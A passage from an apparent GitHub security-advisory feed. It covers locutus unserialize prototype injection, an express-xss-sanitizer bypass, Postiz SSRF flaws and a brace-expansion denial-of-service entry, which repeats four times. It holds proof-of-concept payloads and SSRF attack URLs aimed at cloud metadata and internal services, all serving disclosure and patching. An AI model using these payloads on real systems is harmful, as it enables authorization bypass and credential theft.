console.log('isAdmin' in config);      // true — bypasses 'in' checks
console.log(config.hasOwnProperty('isAdmin')); // false — invisible to hasOwnProperty
</code></pre>
<p><strong>Verified output:</strong></p>
<pre><code>true
[ 'name' ]
true
false
</code></pre>
<p><strong>Step 2 — for...in propagation makes injected properties real:</strong></p>
<pre><code class="language-js">const copy = {};
for (const k in config) copy[k] = config[k];
console.log(copy.isAdmin);                     // true (now an own property)
console.log(copy.hasOwnProperty('isAdmin'));    // true
</code></pre>
<p><strong>Verified output:</strong></p>
<pre><code>true
true
</code></pre>
<p><strong>Step 3 — Method override denial of service:</strong></p>
<pre><code class="language-js">const payload2 = 'a:1:{s:9:"__proto__";a:1:{s:14:"hasOwnProperty";b:1;}}';
const obj = unserialize(payload2);
obj.hasOwnProperty('x');  // TypeError: obj.hasOwnProperty is not a function
</code></pre>
<p><strong>Verified output:</strong></p>
<pre><code>TypeError: obj.hasOwnProperty is not a function
</code></pre>
<p><strong>Step 4 — Object type (stdClass) is also vulnerable:</strong></p>
<pre><code class="language-js">const payload3 = 'O:8:"stdClass":2:{s:9:"__proto__";a:1:{s:7:"isAdmin";b:1;}s:4:"name";s:3:"bob";}';
const obj2 = unserialize(payload3);
console.log(obj2.isAdmin);       // true
console.log('isAdmin' in obj2);  // true
</code></pre>
<p><strong>Step 5 — Confirm NOT global pollution:</strong></p>
<pre><code class="language-js">console.log(({}).isAdmin);  // undefined — global Object.prototype is clean
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Property injection</strong>: Attacker-controlled properties become accessible on the deserialized object via dot notation and the <code>in</code> operator while being invisible to <code>Object.keys()</code> and <code>hasOwnProperty()</code>. Applications that use <code>if (config.isAdmin)</code> or <code>if ('role' in config)</code> patterns on deserialized data are vulnerable to authorization bypass.</li>
<li><strong>Property propagation</strong>: When consuming code copies the object using <code>for...in</code> (a common JavaScript pattern for object spreading or cloning), injected prototype properties materialize as real own properties, surviving all subsequent <code>hasOwnProperty</code> checks.</li>
<li><strong>Denial of service</strong>: The injected prototype can override <code>hasOwnProperty</code>, <code>toString</code>, <code>valueOf</code>, and other <code>Object.prototype</code> methods with non-function values, causing <code>TypeError</code> when these methods are called on the deserialized object.</li>
</ul>
<p>The primary use case for locutus <code>unserialize</code> is deserializing PHP-serialized data in JavaScript applications, often from external or untrusted sources. This makes the attack surface realistic.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Filter dangerous keys before assignment in both <code>expectArrayItems</code> and <code>expectObject</code>. Use <code>Object.defineProperty</code> to create a data property without triggering the <code>__proto__</code> setter:</p>
<pre><code class="language-typescript">const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

// In expectArrayItems (line 358) and expectObject (line 278):
const keyStr = String(key[0]); // or String(prop[0]) in expectObject
if (DANGEROUS_KEYS.has(keyStr)) {
  Object.defineProperty(items, keyStr, {
    value: item[0],
    writable: true,
    enumerable: true,
    configurable: true,
  });
} else {
  items[keyStr] = item[0];
}
</code></pre>
<p>Alternatively, create objects with a null prototype to prevent <code>__proto__</code> setter invocation entirely:</p>
<pre><code class="language-typescript">// Replace: const items: UnserializedObject = {}
// With:
const items = Object.create(null) as UnserializedObject;
</code></pre>
<p>The <code>Object.create(null)</code> approach is more robust as it prevents the <code>__proto__</code> setter from ever being triggered, regardless of key value.</p>
<h2 id="maintainer-reponse">Maintainer Reponse</h2>
<p>Thank you for the report. This issue was reproduced locally against <code>locutus@3.0.24</code>, confirming that <code>unserialize()</code> was vulnerable to <code>__proto__</code>-driven prototype injection on the returned object.</p>
<p>This is now fixed on <code>main</code> and released in <code>locutus@3.0.25</code>.</p>
<h2 id="fix-shipped-in">Fix Shipped In</h2>
<ul>
<li><strong>PR:</strong> <a href="https://github.com/locutusjs/locutus/pull/597">#597</a></li>
<li><strong>Merge commit on <code>main</code>:</strong> <code>345a6211e1e6f939f96a7090bfeff642c9fcf9e4</code></li>
<li><strong>Release:</strong> <a href="https://github.com/locutusjs/locutus/releases/tag/v3.0.25">v3.0.25</a></li>
</ul>
<h2 id="what-the-fix-does">What the Fix Does</h2>
<p>The fix hardens <code>src/php/var/unserialize.ts</code> by treating <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> as dangerous keys and defining them as plain own properties instead of assigning through normal bracket notation. This preserves the key in the returned value without invoking JavaScript's prototype setter semantics.</p>
<h2 id="tested-repro-before-the-fix">Tested Repro Before the Fix</h2>
<ul>
<li>Attacker-controlled serialized <code>__proto__</code> key produced inherited properties on the returned object</li>
<li><code>Object.keys()</code> hid the injected key while <code>'key' in obj</code> stayed true</li>
<li>Built-in methods like <code>hasOwnProperty</code> could be disrupted</li>
</ul>
<h2 id="tested-state-after-the-fix-in-3025">Tested State After the Fix in <code>3.0.25</code></h2>
<ul>
<li>Dangerous keys are kept as own enumerable properties</li>
<li>The returned object's prototype is not replaced</li>
<li>The regression is covered by <code>test/custom/unserialize-prototype-pollution.vitest.ts</code></li>
</ul>
<hr>
<p>The locutus team is treating this as a real package vulnerability with patched version <code>3.0.25</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/locutusjs/locutus/security/advisories/GHSA-4mph-v827-f877">https://github.com/locutusjs/locutus/security/advisories/GHSA-4mph-v827-f877</a></li>
<li><a href="https://github.com/locutusjs/locutus/pull/597">https://github.com/locutusjs/locutus/pull/597</a></li>
<li><a href="https://github.com/locutusjs/locutus/commit/345a6211e1e6f939f96a7090bfeff642c9fcf9e4">https://github.com/locutusjs/locutus/commit/345a6211e1e6f939f96a7090bfeff642c9fcf9e4</a></li>
<li><a href="https://github.com/locutusjs/locutus/releases/tag/v3.0.25">https://github.com/locutusjs/locutus/releases/tag/v3.0.25</a></li>
<li><a href="https://github.com/advisories/GHSA-4mph-v827-f877">https://github.com/advisories/GHSA-4mph-v827-f877</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mph-v827-f877</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-27T17:57:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[express-xss-sanitizer] Express XSS Sanitizer: allowedTags/allowedAttributes bypass leads to permissive sanitization (XSS risk)]]></title>
        <id>https://github.com/advisories/GHSA-3843-rr4g-m8jq</id>
        <link href="https://github.com/advisories/GHSA-3843-rr4g-m8jq"/>
        <updated>2026-03-27T17:56:47.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>A vulnerability has been identified in express-xss-sanitizer (&lt;= 2.0.1) where restrictive sanitization configurations are silently ignored.</p>
<p>When a developer explicitly sets:</p>
<p>  allowedTags: []
  allowedAttributes: {}</p>
<p>the library incorrectly treats these values as "not provided" due to length/emptiness checks, and falls back to sanitize-html's default configuration.</p>
<p>As a result, instead of stripping all HTML tags and attributes, the sanitizer allows a permissive set of tags <code> (e.g., &lt;a&gt;, &lt;p&gt;, &lt;div&gt;, etc.) and attributes (e.g., href on &lt;a&gt;)</code>.</p>
<p>This behavior violates the expected API contract and may lead to security issues such as content injection or XSS, depending on how the sanitized output is used.</p>
<h2 id="impact">Impact</h2>
<p>Developers intending to fully strip HTML content by providing empty allowedTags or allowedAttributes configurations may unknowingly allow a wide range of HTML elements and attributes.</p>
<p>This can result in:</p>
<ul>
<li>Injection of unintended HTML content <code>(e.g., &lt;div&gt;, &lt;table&gt;, headings)</code></li>
<li>Injection of links via<code> &lt;a href="..."&gt;</code></li>
<li>Potential XSS vectors depending on downstream usage</li>
</ul>
<p>The impact depends on how the sanitized output is rendered or consumed, but the root issue is a mismatch between developer intent and actual behavior.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">const { sanitize } = require('express-xss-sanitizer');
const sanitizeHtml = require('sanitize-html');

const input = '&lt;a href="http://evil.com"&gt;click&lt;/a&gt;&lt;p&gt;phish&lt;/p&gt;';

// Using express-xss-sanitizer (v2.0.1)
sanitize(input, { allowedTags: [], allowedAttributes: {} });
// =&gt; '&lt;a href="http://evil.com"&gt;click&lt;/a&gt;&lt;p&gt;phish&lt;/p&gt;'

// Expected behavior (sanitize-html directly)
sanitizeHtml(input, { allowedTags: [], allowedAttributes: {} });
// =&gt; 'clickphish'
</code></pre>
<h2 id="root-cause">Root Cause</h2>
<p>The issue was caused by validation logic that checked for non-empty arrays/objects:</p>
<ul>
<li>allowedTags required length &gt; 0</li>
<li>allowedAttributes required Object.keys(...).length &gt; 0</li>
</ul>
<p>This caused empty configurations ([]) and ({}) to be ignored, resulting in fallback to default permissive settings.</p>
<h2 id="fix">Fix</h2>
<p>The validation logic has been updated to respect explicitly provided empty configurations.</p>
<p>Now, if allowedTags or allowedAttributes are provided (even if empty), they are passed directly to sanitize-html without being overridden.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/AhmedAdelFahim/express-xss-sanitizer/security/advisories/GHSA-3843-rr4g-m8jq">https://github.com/AhmedAdelFahim/express-xss-sanitizer/security/advisories/GHSA-3843-rr4g-m8jq</a></li>
<li><a href="https://github.com/AhmedAdelFahim/express-xss-sanitizer/commit/5623009ef11dcf095c163a38dea07b9cc22ad19f">https://github.com/AhmedAdelFahim/express-xss-sanitizer/commit/5623009ef11dcf095c163a38dea07b9cc22ad19f</a></li>
<li><a href="https://github.com/AhmedAdelFahim/express-xss-sanitizer/releases/tag/v2.0.2">https://github.com/AhmedAdelFahim/express-xss-sanitizer/releases/tag/v2.0.2</a></li>
<li><a href="https://github.com/advisories/GHSA-3843-rr4g-m8jq">https://github.com/advisories/GHSA-3843-rr4g-m8jq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3843-rr4g-m8jq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T17:56:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[postiz] Postiz has Multiple SSRF Vectors - Webhooks, RSS Feed, URL Loader]]></title>
        <id>https://github.com/advisories/GHSA-89v5-38xr-9m4j</id>
        <link href="https://github.com/advisories/GHSA-89v5-38xr-9m4j"/>
        <updated>2026-03-27T15:47:57.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Postiz has multiple SSRF vulnerabilities where user-provided URLs are fetched server-side without any IP validation or SSRF protection.</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<h3 id="1-webhook-send-endpoint-most-critical">1. Webhook Send Endpoint (Most Critical)</h3>
<p><strong><code>apps/backend/src/api/routes/webhooks.controller.ts</code> lines 58-70:</strong></p>
<pre><code class="language-typescript">async sendWebhook(@Body() body: any, @Query('url') url: string) {
  try {
    await fetch(url, {  // No URL validation
      method: 'POST',
      body: JSON.stringify(body),
      headers: { 'Content-Type': 'application/json' },
    });
  } catch (err) { }
  return { send: true };
}
</code></pre>
<p>Accepts arbitrary URL via query parameter and fetches directly.</p>
<h3 id="2-stored-webhook-delivery">2. Stored Webhook Delivery</h3>
<p><strong><code>apps/orchestrator/src/activities/post.activity.ts</code> lines 256-281:</strong></p>
<pre><code class="language-typescript">async sendWebhooks(postId: string, orgId: string, integrationId: string) {
  const webhooks = await this._webhookService.getWebhooks(orgId);
  return Promise.all(
    webhooks.map(async (webhook) =&gt; {
      await fetch(webhook.url, {  // Stored URL, no validation
        method: 'POST',
        body: JSON.stringify(post),
      });
    })
  );
}
</code></pre>
<h3 id="3-rssxml-feed-parser">3. RSS/XML Feed Parser</h3>
<p><strong><code>libraries/nestjs-libraries/src/database/prisma/autopost/autopost.service.ts</code> line 135:</strong></p>
<pre><code class="language-typescript">async loadXML(url: string) {
  const { items } = await parser.parseURL(url);  // No URL validation
}
</code></pre>
<h3 id="4-html-content-loader">4. HTML Content Loader</h3>
<p><strong><code>libraries/nestjs-libraries/src/database/prisma/autopost/autopost.service.ts</code> line 185:</strong></p>
<pre><code class="language-typescript">async loadUrl(url: string) {
  const loadDom = new JSDOM(await (await fetch(url)).text());  // No validation
}
</code></pre>
<h2 id="missing-protections">Missing Protections</h2>
<ul>
<li>No <code>request-filtering-agent</code> or SSRF library</li>
<li>No private IP range filtering</li>
<li>No cloud metadata endpoint blocking</li>
<li>No DNS rebinding protection</li>
<li>URL validation only via <code>@IsUrl()</code> decorator (format only, no IP check)</li>
</ul>
<h2 id="attack-scenarios">Attack Scenarios</h2>
<ol>
<li><code>POST /webhooks/send?url=http://169.254.169.254/latest/meta-data/</code> → AWS metadata theft</li>
<li><code>POST /autopost/send?url=http://127.0.0.1:6379</code> → Internal Redis access</li>
<li>Create webhook with <code>http://10.0.0.1:8080/admin</code> → Internal service access on post publish</li>
</ol>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Cloud metadata theft</strong>: AWS/GCP/Azure credentials</li>
<li><strong>Internal network scanning</strong>: Full access to private IP ranges</li>
<li><strong>Multiple entry points</strong>: Webhooks, RSS feeds, URL loader all vulnerable</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitroomhq/postiz-app/security/advisories/GHSA-89v5-38xr-9m4j">https://github.com/gitroomhq/postiz-app/security/advisories/GHSA-89v5-38xr-9m4j</a></li>
<li><a href="https://github.com/gitroomhq/postiz-app/commit/0ad89ccd26b1c387c4f3f3544b18c20d33586466">https://github.com/gitroomhq/postiz-app/commit/0ad89ccd26b1c387c4f3f3544b18c20d33586466</a></li>
<li><a href="https://github.com/gitroomhq/postiz-app/commit/be5d871896e97cb1f5a2c9241f156b6a1e1debe8">https://github.com/gitroomhq/postiz-app/commit/be5d871896e97cb1f5a2c9241f156b6a1e1debe8</a></li>
<li><a href="https://github.com/gitroomhq/postiz-app/releases/tag/v2.21.2">https://github.com/gitroomhq/postiz-app/releases/tag/v2.21.2</a></li>
<li><a href="https://github.com/advisories/GHSA-89v5-38xr-9m4j">https://github.com/advisories/GHSA-89v5-38xr-9m4j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-89v5-38xr-9m4j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T15:47:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[postiz] Postiz App has a High-Severity SSRF Vulnerability via Next.js]]></title>
        <id>https://github.com/advisories/GHSA-vj2p-7pgw-g2wf</id>
        <link href="https://github.com/advisories/GHSA-vj2p-7pgw-g2wf"/>
        <updated>2026-03-27T15:46:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A successful SSRF attack allows an attacker to:</p>
<ul>
<li>Bypass firewalls to scan and interact with internal network services/ports.</li>
<li>Access sensitive cloud metadata services (e.g., AWS IMDS 169.254.169.254) to potentially leak instance credentials.</li>
<li>Pivot into the internal network environment where Postiz is hosted.</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds known to this, please upgrade to Postiz version <code>v2.21.1</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitroomhq/postiz-app/security/advisories/GHSA-vj2p-7pgw-g2wf">https://github.com/gitroomhq/postiz-app/security/advisories/GHSA-vj2p-7pgw-g2wf</a></li>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g">https://github.com/vercel/next.js/security/advisories/GHSA-fr5h-rqp8-mj6g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-34351">https://nvd.nist.gov/vuln/detail/CVE-2024-34351</a></li>
<li><a href="https://github.com/advisories/GHSA-vj2p-7pgw-g2wf">https://github.com/advisories/GHSA-vj2p-7pgw-g2wf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vj2p-7pgw-g2wf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-27T15:46:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: Zero-step sequence causes process hang and memory exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-f886-m6hf-6m8v</id>
        <link href="https://github.com/advisories/GHSA-f886-m6hf-6m8v"/>
        <updated>2026-03-27T13:44:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A brace pattern with a zero step value (e.g., <code>{1..2..0}</code>) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.</p>
<p>The loop in question:</p>
<p><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184</a></p>
<p><code>test()</code> is one of</p>
<p><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113</a></p>
<p>The increment is computed as <code>Math.abs(0) = 0</code>, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a <code>RangeError</code>. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.</p>
<p>This affects any application that passes untrusted strings to expand(), or by error sets a step value of <code>0</code>. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to versions</p>
<ul>
<li>5.0.5+</li>
</ul>
<p>A step increment of 0 is now sanitized to 1, which matches bash behavior.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Sanitize strings passed to <code>expand()</code> to ensure a step value of <code>0</code> is not used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/issues/98">https://github.com/juliangruber/brace-expansion/issues/98</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/95">https://github.com/juliangruber/brace-expansion/pull/95</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/96">https://github.com/juliangruber/brace-expansion/pull/96</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/97">https://github.com/juliangruber/brace-expansion/pull/97</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5">https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2">https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a">https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a</a></li>
<li><a href="https://github.com/advisories/GHSA-f886-m6hf-6m8v">https://github.com/advisories/GHSA-f886-m6hf-6m8v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f886-m6hf-6m8v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T18:29:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: Zero-step sequence causes process hang and memory exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-f886-m6hf-6m8v</id>
        <link href="https://github.com/advisories/GHSA-f886-m6hf-6m8v"/>
        <updated>2026-03-27T13:44:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A brace pattern with a zero step value (e.g., <code>{1..2..0}</code>) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.</p>
<p>The loop in question:</p>
<p><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184</a></p>
<p><code>test()</code> is one of</p>
<p><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113</a></p>
<p>The increment is computed as <code>Math.abs(0) = 0</code>, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a <code>RangeError</code>. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.</p>
<p>This affects any application that passes untrusted strings to expand(), or by error sets a step value of <code>0</code>. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to versions</p>
<ul>
<li>5.0.5+</li>
</ul>
<p>A step increment of 0 is now sanitized to 1, which matches bash behavior.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Sanitize strings passed to <code>expand()</code> to ensure a step value of <code>0</code> is not used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/issues/98">https://github.com/juliangruber/brace-expansion/issues/98</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/95">https://github.com/juliangruber/brace-expansion/pull/95</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/96">https://github.com/juliangruber/brace-expansion/pull/96</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/97">https://github.com/juliangruber/brace-expansion/pull/97</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5">https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2">https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a">https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a</a></li>
<li><a href="https://github.com/advisories/GHSA-f886-m6hf-6m8v">https://github.com/advisories/GHSA-f886-m6hf-6m8v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f886-m6hf-6m8v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T18:29:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: Zero-step sequence causes process hang and memory exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-f886-m6hf-6m8v</id>
        <link href="https://github.com/advisories/GHSA-f886-m6hf-6m8v"/>
        <updated>2026-03-27T13:44:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A brace pattern with a zero step value (e.g., <code>{1..2..0}</code>) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.</p>
<p>The loop in question:</p>
<p><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184</a></p>
<p><code>test()</code> is one of</p>
<p><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113</a></p>
<p>The increment is computed as <code>Math.abs(0) = 0</code>, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a <code>RangeError</code>. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.</p>
<p>This affects any application that passes untrusted strings to expand(), or by error sets a step value of <code>0</code>. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to versions</p>
<ul>
<li>5.0.5+</li>
</ul>
<p>A step increment of 0 is now sanitized to 1, which matches bash behavior.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Sanitize strings passed to <code>expand()</code> to ensure a step value of <code>0</code> is not used.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-f886-m6hf-6m8v</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/issues/98">https://github.com/juliangruber/brace-expansion/issues/98</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/95">https://github.com/juliangruber/brace-expansion/pull/95</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/96">https://github.com/juliangruber/brace-expansion/pull/96</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/pull/97">https://github.com/juliangruber/brace-expansion/pull/97</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5">https://github.com/juliangruber/brace-expansion/commit/311ac0d54994158c0a384e286a7d6cbb17ee8ed5</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2">https://github.com/juliangruber/brace-expansion/commit/7fd684f89fdde3549563d0a6522226a9189472a2</a></li>
<li><a href="https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a">https://github.com/juliangruber/brace-expansion/commit/b9cacd9e55e7a1fa588fe4b7bb1159d52f1d902a</a></li>
<li><a href="https://github.com/advisories/GHSA-f886-m6hf-6m8v">https://github.com/advisories/GHSA-f886-m6hf-6m8v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f886-m6hf-6m8v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-26T18:29:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[brace-expansion] brace-expansion: Zero-step sequence causes process hang and memory exhaustion]]></title>
        <id>https://github.com/advisories/GHSA-f886-m6hf-6m8v</id>
        <link href="https://github.com/advisories/GHSA-f886-m6hf-6m8v"/>
        <updated>2026-03-27T13:44:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A brace pattern with a zero step value (e.g., <code>{1..2..0}</code>) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.</p>
<p>The loop in question:</p>
<p><a href="https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184">https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184</a></p>
<p><code>test()</code> is one of</p>
